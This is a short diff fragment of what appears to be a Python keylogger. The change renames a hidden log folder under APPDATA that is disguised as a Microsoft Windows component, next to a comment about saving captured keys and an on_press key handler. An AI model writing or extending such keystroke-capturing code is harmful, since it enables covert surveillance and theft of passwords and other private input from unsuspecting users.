@@ -4,7 +4,7 @@ from os import getenv
 file_local_save = getenv('APPDATA')
 
 # File where we gonna save the keys
-log_file = rf"{file_local_save}\Microsoft Windows Agent\log.txt"
+log_file = rf"{file_local_save}\MicrosoftWindowsAgent\log.txt"
 
 # Log function
 def on_press(key):
